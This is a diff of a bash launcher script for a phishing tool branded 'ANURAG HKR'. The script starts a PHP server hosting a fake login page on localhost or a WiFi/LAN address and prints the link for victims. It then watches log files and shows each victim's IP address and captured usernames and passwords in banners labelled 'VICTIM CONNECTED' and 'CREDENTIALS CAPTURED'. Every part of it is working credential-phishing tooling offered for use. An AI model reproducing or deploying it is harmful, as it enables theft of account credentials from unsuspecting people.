@@ -1,50 +1,78 @@
 #!/bin/bash
 
-# --- COLORS (रंगों की सेटिंग) ---
-RED='\033[1;31m'
-GREEN='\033[1;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[1;34m'
+# --- 🎨 COLORS ---
+GOLD='\033[1;33m'
 CYAN='\033[1;36m'
 WHITE='\033[1;37m'
-NC='\033[0m'
+GREY='\033[1;30m'
+RED='\033[1;31m'
+GREEN='\033[1;32m'
+RESET='\033[0m'
 
-# --- CLEANUP (Ctrl+C दबाने पर बंद करना) ---
-trap "echo -e '\n${RED}[!] Stopping Server... Exiting.${NC}'; kill $PID_PHP 2>/dev/null; exit" SIGINT SIGTERM
+# --- 🛠️ FIX PERMISSION ERROR (MAGIC FIX) ---
+# Hum PHP ke liye ek local 'tmp' folder banayenge
+mkdir -p auth/tmp
+chmod 777 auth/tmp
+export TMPDIR=$(pwd)/auth/tmp
 
-# --- CLEAR SCREEN & LOGS ---
-clear
+# --- 🛡️ ICONS ---
+ICON_LOCK="🔒"
+ICON_WIFI="📡"
+ICON_USER="💀"
+ICON_KEY="🔑"
+ICON_GEAR="⚙️"
+ICON_CHECK="✅"
+ICON_ANDROID="📱"
+
+# --- DETECT SYSTEM ---
+if [[ -d "/data/data/com.termux/files/home" ]]; then
+    IS_TERMUX=true
+else
+    IS_TERMUX=false
+fi
+
+# --- AUTO KILL OLD PROCESS ---
+# Purana server band karna jaruri hai
+pkill -f php > /dev/null 2>&1
+
+# --- CLEANUP TRAP ---
+trap "echo -e '\n${RED}[!] Exiting Tool...${RESET}'; pkill -f php; exit" SIGINT SIGTERM
+
+# --- SETUP FILES ---
 rm -rf usernames.txt ip.txt
 touch usernames.txt ip.txt
 
-# --- BANNER (ANURAG HKR LOGO) ---
-echo -e "${BLUE}"
-echo "    _    _   _ _   _ ____      _    ____ "
-echo "   / \  | \ | | | | |  _ \    / \  / ___|"
-echo "  / _ \ |  \| | | | | |_) |  / _ \| |  _ "
-echo " / ___ \| |\  | |_| |  _ <  / ___ \ |_| |"
-echo "/_/   \_\_| \_|\___/|_| \_\/_/   \_\____|"
-echo ""
-echo " _   _ _  _______  "
-echo "| | | | |/ /  _  \ "
-echo "| |_| | ' /| |_) | "
-echo "|  _  | . \|  _ <  "
-echo "|_| |_|_|\_\_| \_\ "
-echo -e "${WHITE}         v2.0 (By Anurag)${NC}"
-echo ""
+# --- BANNER ---
+clear
+echo -e "${GOLD}"
+echo "╔══════════════════════════════════════════════════════╗"
+echo "║                                                      ║"
+echo "║    _    _   _ _   _ ____      _    ____              ║"
+echo "║   / \  | \ | | | | |  _ \    / \  / ___|             ║"
+echo "║  / _ \ |  \| | | | | |_) |  / _ \| |  _              ║"
+echo "║ / ___ \| |\  | |_| |  _ <  / ___ \ |_| |             ║"
+echo "║/_/   \_\_| \_|\___/|_| \_\/_/   \_\____|             ║"
+echo "║                                                      ║"
+if [ "$IS_TERMUX" = true ]; then
+    echo "║      ${GREEN}SYSTEM DETECTED: ${ICON_ANDROID} ANDROID (TERMUX)${GOLD}           ║"
+else
+    echo "║      ${CYAN}SYSTEM DETECTED: 💻 PC / LINUX / MAC${GOLD}            ║"
+fi
+echo "║         ${WHITE}CREATED BY : ${CYAN}ANURAG HKR${GOLD}                      ║"
+echo "╚══════════════════════════════════════════════════════╝"
+echo -e "${RESET}"
 
 # --- MENU ---
-echo -e "${RED}[${WHITE}01${RED}]${CYAN} Localhost ${WHITE}(127.0.0.1)"
-echo -e "${RED}[${WHITE}02${RED}]${CYAN} Local Network ${GREEN}[WiFi/LAN]"
+echo -e " ${GOLD}╔══ [ SELECT ATTACK MODE ] ══════════════════════════╗${RESET}"
+echo -e " ${GOLD}║${RESET}  [${CYAN}01${RESET}] ${WHITE}Localhost     ${GREY}(Self Test)${RESET}                   ${GOLD}║${RESET}"
+echo -e " ${GOLD}║${RESET}  [${CYAN}02${RESET}] ${WHITE}LAN Network   ${GREEN}(WiFi/Hotspot Attack)${RESET}          ${GOLD}║${RESET}"
+echo -e " ${GOLD}╚════════════════════════════════════════════════════╝${RESET}"
 echo ""
-
-# --- SELECTION ---
-echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${NC}"
+echo -ne " ${ICON_GEAR} ${GOLD}Select Option : ${RESET}"
 read -n 1 option
 echo ""
 echo ""
 
-# --- SERVER LOGIC ---
 if [[ $option == "1" ]]; then
     HOST="127.0.0.1"
     PORT="8080"
@@ -52,36 +80,72 @@ elif [[ $option == "2" ]]; then
     HOST="0.0.0.0"
     PORT="8080"
 else
-    echo -e "${RED}[!] Invalid Option!${NC}"
+    echo -e "${RED} [!] Invalid Selection! ${RESET}"
     exit 1
 fi
 
-# --- STARTING SERVER ---
-echo -e "${YELLOW}[*] Starting PHP Server...${NC}"
-# Server Background Me Start Hoga
-php -S $HOST:$PORT > /dev/null 2>&1 & 
-PID_PHP=$! 
+# --- STARTING SERVER (WITH ERROR LOGGING) ---
+echo -e " ${ICON_WIFI}  ${CYAN}Starting PHP Server...${RESET}"
 
-sleep 2
-echo -e "${GREEN}[-] Hosted Successfully at : ${WHITE}http://$HOST:$PORT ${NC}"
-echo -e "${YELLOW}[-] Waiting for Login Info, ${RED}Ctrl + C ${YELLOW}to exit ...${NC}"
+# Error log dekhne ke liye file me save karenge
+php -S $HOST:$PORT -t . > php_error.log 2>&1 &
+PID_PHP=$!
+sleep 3
+
+# Check if PHP is running
+if ! ps -p $PID_PHP > /dev/null; then
+    echo -e " ${RED}[!] Server Failed to Start! Check Error Below:${RESET}"
+    echo -e "${GOLD}------------------------------------------------${RESET}"
+    cat php_error.log
+    echo -e "${GOLD}------------------------------------------------${RESET}"
+    exit 1
+fi
+
+echo -e " ${ICON_CHECK}  ${GREEN}Status: ${WHITE}ONLINE${RESET}"
+
+# IP DISPLAY
+if [[ $option == "2" ]]; then
+    if [ "$IS_TERMUX" = true ]; then
+        MYIP=$(ifconfig 2>/dev/null | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | grep -v "127.0.0.1" | head -n 1)
+    else
+        MYIP=$(ipconfig 2>/dev/null | grep "IPv4" | head -n 1 | cut -d: -f2 | tr -d ' ') 
+        if [ -z "$MYIP" ]; then
+            MYIP=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n 1)
+        fi
+    fi
+    
+    if [ -z "$MYIP" ]; then
+        echo -e " ${ICON_LOCK}  ${RED}Link: ${WHITE}http://$HOST:$PORT ${RESET}"
+    else
+        echo -e " ${ICON_LOCK}  ${RED}Link: ${WHITE}http://$MYIP:$PORT ${RESET}"
+    fi
+else
+    echo -e " ${ICON_LOCK}  ${RED}Link: ${WHITE}http://127.0.0.1:$PORT ${RESET}"
+fi
+
+echo -e " ${GREY} Waiting for targets... (Press Ctrl+C to stop)${RESET}"
 echo ""
 
-# --- LIVE MONITORING (Jadoo) ---
+# --- LIVE MONITORING ---
 tail -f usernames.txt ip.txt --pid=$PID_PHP 2>/dev/null | while read line; do
-    
     if [[ "$line" == "IP:"* ]]; then
-        echo -e "${GREEN}[+] Victim IP Found !${NC}"
-        echo -e "${CYAN}[-] $line ${NC}"
-    
+        IP=${line#IP: }
+        echo -e "\n ${GOLD}╔══ [ ${ICON_WIFI} VICTIM CONNECTED ] ══════════════════════════╗${RESET}"
+        echo -e " ${GOLD}║${RESET}  IP Address : ${CYAN}$IP${RESET}"
+        echo -e " ${GOLD}╚════════════════════════════════════════════════════╝${RESET}"
+        echo -e "\a"
     elif [[ "$line" == *"Login info Found"* ]]; then
-        echo -e "${GREEN}$line${NC}"
-    
-    elif [[ "$line" == *"Account"* || "$line" == *"Password"* ]]; then
-        echo -e "${CYAN}$line${NC}"
-    
-    else
-        echo -e "${YELLOW}$line${NC}"
+        echo -e " ${RED}╔══ [ ${ICON_USER} CREDENTIALS CAPTURED ] ══════════════════════╗${RESET}"
+    elif [[ "$line" == *"Account"* ]]; then
+        USER=${line#* : }
+        echo -e " ${RED}║${RESET}  ${ICON_USER} Username : ${WHITE}$USER${RESET}"
+    elif [[ "$line" == *"Password"* ]]; then
+        PASS=${line#* : }
+        echo -e " ${RED}║${RESET}  ${ICON_KEY} Password : ${WHITE}$PASS${RESET}"
+    elif [[ "$line" == *"Date"* ]]; then
+        DATE=${line#* : }
+        echo -e " ${RED}║${RESET}  ⏰ Time     : ${GREY}$DATE${RESET}"
+        echo -e " ${RED}╚════════════════════════════════════════════════════╝${RESET}"
+        echo -e "\a"
     fi
-
 done
